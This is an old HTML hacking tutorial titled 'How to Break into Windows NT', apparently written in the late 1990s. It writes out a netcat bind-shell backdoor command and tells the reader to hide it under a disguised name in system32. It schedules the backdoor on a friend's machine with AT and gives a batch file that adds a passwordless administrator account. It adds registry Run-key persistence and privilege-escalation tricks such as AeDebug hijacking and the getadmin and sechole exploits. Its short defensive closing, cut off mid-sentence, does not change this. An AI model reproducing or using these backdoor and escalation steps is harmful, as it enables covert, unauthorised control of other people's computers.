<p>How to Break into Windows NT: Backdoors and Practical Jokes
<br>____________________________________________________________
<p>by keydet89@yahoo.com
<br>&nbsp;
<p>[Backdoors and Practical Jokes]
<p>Creating backdoors is how you can insure your ability to return to the
<br>system at will.&nbsp; This is almost a black art when dealing with
Un*x
<br>systems, and it can also be done on NT.
<p>netcat, from Weld Pond, takes advantage of any user's ability to use
<br>a local port.&nbsp; netcat is a command-line utility that has several
<br>switches used to configure it's operation.&nbsp; This makes netcat,
combined
<br>with a properly configured command-line launched from a batch file,
<br>an excellent choice for a backdoor.
<br>(get netcat for NT from http://www.l0pht.com/weld)
<p>The batch file needs to contain:
<p>nc -L -d -p [port] -t -e cmd.exe
<p>&nbsp;L&nbsp; tells netcat to open keep listening after the current
<br>&nbsp; session terminates
<br>&nbsp;d detach - don't open a DOS window when running (IMPORTANT)
<br>&nbsp;p which port to bind to
<br>&nbsp;t enable telnet negotiations
<br>&nbsp;e command to execute upon connection
<p>Copy this command line into a batch file named "runnc.bat" or
<br>something similar.&nbsp; Then copy both the netcat executeable file
and
<br>the batch file to a directory that is in the PATH on the target
<br>machine...c:\winnt\system32\ is a good place to hide them.&nbsp; Another
<br>little trick to keep in mind is to rename the netcat executable from
<br>'nc.exe' to something innocuous, like 'winlog.exe' (and make sure to
<br>make the appropriate changes to the batch file).&nbsp; That way, when
you
<br>or your buddy opens the TaskList, there won't seem to be any 'unusual'
<br>programs running.&nbsp; Run the batch file on your own machine, and
open
<br>the TaskList (right-click on the TaskBar, and choose TaskList)...
<p>Once this batch file is run, all you need to do is connect via telnet,
<br>or netcat in client mode:
<p>c:\>nc -v [ipaddress of target] [port]
<p>So how do you run this batch file?&nbsp; By default, NT doesn't have
an
<br>interactive telnet server installed so that you can just log in, so
<br>what do you do?&nbsp; Well, there is a great little service called
the
<br>Schedule (or 'AT') service, which lets you schedule programs to be
<br>run at a later date.&nbsp; To see if your Schedule service is running,
<br>you can either click Control Panel -> Services, and check it, or
<br>if you have Perl installed (see above), you can run the following
<br>script to see if the service is running, and if not, start it:
<p>-----&nbsp; begin script&nbsp; -----
<br># atchk.plx
<br># Script checks to see if AT service is running on local
<br># machine...if not, starts it.&nbsp; Minor modifications will
<br># allow you to do the same thing on a remote machine, once
<br># have successfully completed the IPC$ connection and have
<br># Administrator rights.
<br>#
<br># usage: perl atchck.plx
<p>use Win32::Service;
<br>use Win32;
<br>my %status;
<p>Win32::Service::GetStatus('','Schedule', \%status);
<br>die "service is arealdy started\n" if ($status{CurrentState} == 4);
<p>Win32::Service::StartService(Win32::NodeName( ),'Schedule') || die
<br>"Can't start service\n";
<p>print "Service started\n";
<br>#**Note:&nbsp; This script was modified from:
<br>#http://www.inforoute.cgs.fr/leberre1/perlser.htm
<br>-----&nbsp; end script&nbsp; -----
<p>Note:&nbsp; Only Administrators or members of the Administrators group
can
<br>run the AT command.
<p>Once installed, the 'runnc.bat' file can be executed via the AT command.
<p>The necessary syntax for the AT command is:
<p>AT [\\computername] [time] "command"
<p>or more particularly:
<p>AT [\\computername] [time] runnc.bat
<p>References to commands can be hidden in various places within the
<br>registry, set to run when a user logs in:
<p>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices
<p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
<p>Note:&nbsp; This last key is where you will find things like AOL's
<br>Instant Messenger.&nbsp; The install puts the reference to the app
there,
<br>but you won't find it in your StartUp box...
<p>Here's another little exercise that you should run on your own machine
<br>first, and then try copying it over to a friend's machine and running
<br>it via the AT command.&nbsp; The batch file below uses commands that
are
<br>native to NT to create a new user account, then make that user a member
<br>of the Administrator group:
<p>-----&nbsp; begin batch file&nbsp; -----
<br>@echo off
<br>net user Admin /add /expires:never /passwordreq:no
<br>net localgroup "Administrators" /add Admin
<br>net localgroup "Users" /del Admin
<br>-----&nbsp; end batch file&nbsp; -----
<p>What are some other neat little tricks to try?&nbsp; Get Netbus from
<br>http://netbus.hypermart.net/ .&nbsp; This little program is similar
to
<br>Back Orifice, and it runs on NT.&nbsp; (Visit the makers of Back Orifice
<br>at http://www.cultdeadcow.com/)
<p>Okay, so you and your 'leet buddies have played around with each
<br>other's machines via the Internet, and pretty much walked through the
<br>exercises listed above.&nbsp; Now, what are some local 'attacks' that
you
<br>can run against your own machine?
<p>[Local Attacks]
<p>Let's say you have a couple of accounts on your NT box, at least one
<br>with Admin rights, and one or two others with user rights.&nbsp; You've
<br>already run through the password cracking exercise and seen how easy
<br>it is to get the 'SAM._' file and crack it.&nbsp; So what else can
you do?
<p>Well, you try the 'getadmin' exploit.&nbsp; This exploit consists of
a
<br>program and .dll file that will add the user to the Administrator group.
<p>Get the necessary files from:
<p>http://www.nmrc.org/files/nt/index.html
<p>The Microsoft site has a hotfix for the "getadmin" exploit, located
<br>at:
<p>ftp://ftp.microsoft.com/bussys/winnt/winnt-public/fixes/usa/
<br>nt40/hotfixes-postSP3/getadmin-fix/
<p>General information on security problems addressed by Microsoft
<br>can be found at:
<p>http://www.microsoft.com/security/issues.htm
<p>For more information on the 'getadmin' exploit, go to:
<p>http://www.ntsecurity.net
<p>and search for 'getadmin'.
<p>All you need to do to test this exploit is log onto your system via
<br>a user account, copy the files into a directory, and run getadmin.exe.
<p>Another local exploit similar to the "getadmin" exploit has popped up.
<br>The exploit works like this:&nbsp; the user runs a program called
<br>"sechole.exe" and the final result (possibly after a reboot) is that
<br>the user now has administrator rights!&nbsp; For more information on
this
<br>and the zipped archive "sechole.zip", go to:
<br>http://www.technotronic.com/microsoft.html
<p>A variation on this exploit involves the Registry setting the
<br>determines what the default debugger (the program run when a user mode
<br>program crashes) is run.
<br>Usually, the setting is:
<br>Hive: HKEY_LOCAL_MACHINE
<br>Key:&nbsp; \Software\Microsoft\Windows NT\CurrentVersion\AeDebug
<br>Value: Debugger
<br>Data Type: REG_SZ
<br>Default Value: drwtsn32 -p %ld -e %ld -g
<p>The "Everyone" group has the ability to set the value of this key, and
<br>is essential how you can exploit it.&nbsp; The debugger runs in the
security
<br>context of the crashed application, so all you need to do is change
the
<br>Default Value (via 'regedit') to point to the User Manager, and then
<br>crash one of the services that are running.&nbsp; Then you can add
accounts
<br>to the User Manager...even to the Administrator group.
<p>*******************************************************************
<br>NEWBIE NOTE:&nbsp; Before any changes are made to the Registry, make
<br>sure that you make a backup of your current Registry using the
<br>"rdisk /s" utility.&nbsp; You can make changes to the Registry by clicking
<br>Start -> Run, and entering either 'regedit' or 'regedt32'.&nbsp; Before
<br>you attempt any of this, read the files pertaining to the Registry
<br>from the Rhino9 site (http://207.89.195.250/texts/), the "Hacker's
<br>Modern Desk Reference" (http://www.antionline.com/SpecialReports/MHD/)
<br>and even "Hardening NT" (http://pw2.netcom.com/~honeyluv/index.html).
<br>*******************************************************************
<p>Another local exploit that you can attempt uses the NTFSDOS utility,
<br>which is nothing more than a bootable DOS diskette that can read (but
<br>not write to) NTFS partitions.&nbsp; This would potentially allow an
attacker
<p>to make off with copies of systems files, to include the SAM database.
<br>The folks at Systems Internals (http://www.sysinternals.com) have not
<br>only an NTFSDOS utility available, but also some tools that give the
<br>user limited write capability.&nbsp; SysInternals also has NTRecover
and
<br>NTLocksmith, along with a variety of other useful tools.
<p>Get a copy of the utility, and try booting your own system with the
<br>diskette in the A:\ drive.
<p>There is a nifty little utility available, one that is essentially a
<br>Linux boot disk:
<p>http://home.eunet.no/~pnordahl/ntpasswd/bootdisk.html
<p>The utility comes with rawrite.exe, so that DOS and Windows users can
<br>download the utility and create the Linux boot disk.
<p>The utility is a NTFS-bootable minimal kernel, with a small program
<br>that allows the user to change any password in the SAM database.
<br>Alternatively, you can find the Linux binary file (without the
<br>rawrite.exe utility) at:
<p>http://www.nmrc.org/files/snt/index.html
<p>called bootdisk.bin, and according to the description, this is the
<br>file you are interested in.&nbsp; You will still need to get a copy
of
<br>rawrite.exe, in order to write the information to a diskette in a
<br>useable form.
<p>Carefully read the instructions on the web page for the utility
<br>(listed above) and if you are feeling especially '31337', try it out
<br>against your own system.
<p>[Final Words]
<p>By now you should be familiar with some of the methods used to attack
<br>and compromise an NT system.&nbsp; Hopefully, you have seen fit to
try out
<br>the exercises on your own system, or against a friend's system (with
<br>permission, of course).&nbsp; And it should start becoming clear what
it
<br>takes to secure a system from attack.&nbsp; The first step is to become
<br>familiar with various exploits by regularly visiting such sites as
<br>RootShell (http://www.rootshell.com), the ISS X-Force site
<br>(http://www.iss.net/xforce), NTSecurity (http://www.ntsecurity.net),
<br>and NTBugTraq (http://www.ntbugtraq.com).&nbsp; Then go to the Microsoft
<br>Support (http://support.microsoft.com) and Security
<br>(http://www.microsoft.com/security) sites to see what the 'official'
<br>fixes are...the NTBugTraq site does a great job of keeping track of
<br>the latest hotfixes, and which ones are obsolete.&nbsp; The Microsoft
Support
<br>site is especially useful, because you can search for information or
<br>specific KnowledgeBase articles, and print out those that you find
<br>useful.&nbsp; The "Hardening NT" document from Santeria Systems
<br>(http://pw2.netcom.com/~honeyluv/index.html) provides an excellent
<br>guide for protecting your system, complete with references to the
<br>appropriate KnowledgeBase article for each step.&nbsp; Finally, Microsoft
<br>maintains a list of security bulletins at:
